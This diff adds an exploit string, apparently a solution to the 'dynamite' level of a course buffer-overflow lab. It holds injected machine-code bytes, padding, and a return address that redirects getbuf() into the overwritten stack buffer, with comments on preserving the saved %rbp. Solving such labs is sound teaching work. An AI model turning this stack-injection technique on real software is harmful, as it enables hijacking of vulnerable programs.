@@ -1,0 +1,8 @@
+48 b8 f7 48 8e 18 8e 14 00 76 68 f3 0e 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 e0 bb ff ff ff 7f 00 00 80 bb ff ff ff 7f 00
+
+# values before couple of 00 00 ... contains byte-code for assembly instructions in dynamit.s
+# value after 00 00 ... contains address of buffer to which control must be passed according with task
+# solution based on hardcoding into exploit string of potentially corrupted by it  
+# region of program state (in this case only corrupted region being saved register %rbp on stack before  
+# overwriting it in getbuf() procedure code)
+
